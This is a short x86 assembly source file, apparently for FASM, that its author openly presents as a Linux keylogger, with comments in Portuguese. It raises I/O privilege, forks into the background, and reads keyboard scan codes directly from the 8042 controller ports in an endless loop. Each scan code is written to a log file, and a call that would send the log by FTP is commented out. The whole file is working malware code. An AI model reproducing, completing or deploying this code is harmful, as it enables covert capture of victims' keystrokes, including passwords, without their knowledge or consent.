;MY 1337 KEYLOGGER FOR LINUX. WRITTEN BY BRUNO GUIMARAES SALVADOR
format ELF executable
segment readable writable executable
entry $
mov	eax,6Eh
mov	ebx,3
int	80h				;IOPL = 3 = Nivel De Hardware SYS_IOPL

mov	eax,2
int	80h				;FORK para continuar o programa
cmp	eax,0
jz	keylogger

ret

keylogger:
push ebp
mov ebp,esp
sub esp,30
mov	eax,8
push	41414141h
mov	ebx,esp
mov	ecx,0
int	80h				;cria arquivo de log SYS_CREAT
mov	[ebp-12],eax

L0:	
mov	ebx,0
L1:
call	GetScancode
ds
mov	byte[ebp-16],al

mov	ebx,[ebp-12]
xor	ecx,ecx
lea	ecx,[ebp-16]
mov	edx,1
mov	eax,4
int	80h				;grava scan codes no arquivo de log SYS_WRITE
;CALL	SENDTOFTP
SKIPIT:

jmp	L0				;LOOP INFINITO PARA CAPTURAR SCAN CODES E GRAVAR EM ARQUIVO

GetScancode:
Inicio:
IN	AL,64h				;le porta do 8042 para saber se foi obtido algum scan code
and	al,21h
cmp	al,1
jnz	Inicio
mov	ecx,6000h
call	delay
IN	AL,60H				;le output buffer do 8042 SE ALGUMA TECLA FOI PRESSIONADA, SEU RESPECTIVO SCAN CODE ESTÁ PARA SER LIDO NESTA PORTA DE E/S
retn

delay:
Q1:
cmp ecx,0
jz Q2
dec ecx
jmp Q1
Q2:
ret